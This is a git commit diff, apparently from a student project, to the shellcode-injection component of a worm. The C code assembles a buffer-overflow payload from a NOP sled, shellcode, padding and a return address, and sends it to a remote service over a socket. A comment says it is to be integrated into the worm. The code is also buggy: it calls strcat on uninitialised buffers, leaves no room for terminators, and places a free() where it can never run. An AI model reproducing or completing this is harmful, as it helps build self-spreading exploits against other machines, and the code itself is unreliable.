0c9a6ab8c9c2318ef9ea0b9fca59533aceea3f20
osboxes.org <drezet@etud.insa-toulouse.fr>
2023-02-23 15:42:23 +0100

    craft_ok

--- worm/injection_shellcode.c
+++ worm/injection_shellcode.c
@@ -18,32 +18,34 @@ __asm__("movq %rsp,%rax");
 }
 
 
-const char* crafted_payload(){
+char* crafted_payload(){
 
 	// Serie de NOP
-	int nb_nop = 40;
-	char nops[nb_nop];
-	char un_nop[] = "\x90";
+	int nb_nop = 10;
+	char *nops = malloc(nb_nop * sizeof(char));
 	for (int i = 0; i < nb_nop; i++){
-		nops[i] = *un_nop;
+		//nops[i] = "\x90";
+		strcat(nops, "\x90");
 	}
 	//printf("%s\n", nops);
 
 	// Shellcode en dur
-	char shellcode[] = "\xf3\x48\x48\x48\x74\xff\x48\xc3\xff\xf2\x0f\xf3\x68\xf2\x90\xf3\xf2\x0f\xf3\xf2\x0f\xf3\x31\x49\x5e\x48\x48\x50\x54\x45\x31\x48\xff\xf4\x66\x00\x48\x48\x48\x74\x48\x48\x74\xff\x0f\xc3\x0f\x48\x48\x48\x48\x48\x48\x48\x48\x74\x48\x48\x74\xff\x66\xc3\x0f\xf3\x80\x75\x55\x48\x00\x48\x74\x48\xe8\xe8\xc6\x5d\xc3\x0f\xc3\x0f\xf3\xe9\xf3\x55\x48\x48\x48\xe8\xb8\x5d\xc3\xf3\x48\x48\xc3";
+	//char shellcode[] = "\xf3\x48\x48\x48\x74\xff\x48\xc3\xff\xf2\x0f\xf3\x68\xf2\x90\xf3\xf2\x0f\xf3\xf2\x0f\xf3\x31\x49\x5e\x48\x48\x50\x54\x45\x31\x48\xff\xf4\x66\x00\x48\x48\x48\x74\x48\x48\x74\xff\x0f\xc3\x0f\x48\x48\x48\x48\x48\x48\x48\x48\x74\x48\x48\x74\xff\x66\xc3\x0f\xf3\x80\x75\x55\x48\x00\x48\x74\x48\xe8\xe8\xc6\x5d\xc3\x0f\xc3\x0f\xf3\xe9\xf3\x55\x48\x48\x48\xe8\xb8\x5d\xc3\xf3\x48\x48\xc3";
 	//char shellcode[] = "\x48\x45\x4c\x4c\x43\x4f\x44\x45";
+	char shellcode[] = "\x41";
 	//printf("%s\n", shellcode);
 
 	// Padding de bp
-	char padding_bp [] = "\x41\x41\x41\x41";
+	char padding_bp [] = "\x41";
 	//printf("%s\n", padding_bp);
 
 	// Adresse de retour en dur
-	char retour[] = "\x01\x40\x73\x74\x88\x34\x60\xb2";
+	//char retour[] = "\x01\x40\x73\x74\x88\x34\x60\xb2";
 	//char retour[] = "\x41\x44\x44\x52\x5f\x52\x45\x54";
+	char retour[] = "\x41";
 	//printf("%s\n", retour);
 
-	char final_buf[sizeof(nops) + sizeof(shellcode) + sizeof(padding_bp) + sizeof(retour)];
+	char *final_buf = malloc((strlen(nops) + strlen(shellcode) + strlen(padding_bp) + strlen(retour)) * sizeof(char));
 
 	strcat(final_buf, nops);
 	strcat(final_buf, shellcode);
@@ -51,22 +53,27 @@ const char* crafted_payload(){
 	strcat(final_buf, retour);
 	//printf("%s\n", final_buf);
 
-	pay_size = sizeof(final_buf);
-	printf("%zu\n", pay_size);
+	pay_size = strlen(final_buf);
+	//printf("%zu\n", pay_size);
 
-	char * pay = malloc(pay_size * sizeof(char));
+	char * pay = malloc(strlen(final_buf) * sizeof(char));
 	//printf("%zu\n", sizeof(pay));
-	pay = final_buf;
-	printf("%s\n", pay);
+	strcpy(pay, final_buf);
+	//printf("%s\n", pay);
+
+	free(nops);
+	free(final_buf);
 
 	return pay;
+
+	free(pay);
 }
 
 
 int func(int sockfd, const char *pay)
 {
 	printf("Overflow en cours...\n");
-	int verif = write(sockfd, pay, sizeof(pay));
+	int verif = write(sockfd, pay, strlen(pay));
 	if (verif == -1){
 		printf("Error : Payload sending failed\n");
 	}
@@ -121,7 +128,7 @@ int main (int argc, char *argv[]){
 	//snprintf(payload, pay_size, crafted_payload());
 
 
-	const char* payload = crafted_payload();
+	char* payload = crafted_payload();
 
 	
     // Ecriture en dur du shellcode : 
@@ -129,17 +136,21 @@ int main (int argc, char *argv[]){
 	// + shellcode (taille à définir POUR TAILLE BOF) 
     // + "A" *4(1 octet chaque)
 	// + @retour_dans_nop (== @relatif A CHERCHER GDB BASE PILE - [size(shellcode) + 4* A + moitié Nop])
-    //char payload[] = "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x48\x45\x4c\x4c\x43\x4f\x44\x45\x41\x41\x41\x41\x40"; // A COMPLETER
+    //const char * payload = "\x90\x90\x90\x90\x90\x48\x45\x4c\x4c\x43\x4f\x44\x45\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"; // A COMPLETER
 
     // COMMENT @retour = @base pile + taille instruction ENTIERE
 
     // Envoi de la payload
 	//long l=get_sp();
 	//printf("Ox%lu\n", l);
+
 	int over_flow = func(sockfd, payload);  // A DECOMMENTER UNE FOIS INTEGREE DANS LE VERS
 
+	//printf("%li\n", strlen(payload));
     printf("%s\n", payload);
 	printf("OK\n");
+
+	free(payload);
     return 0;
 }
 
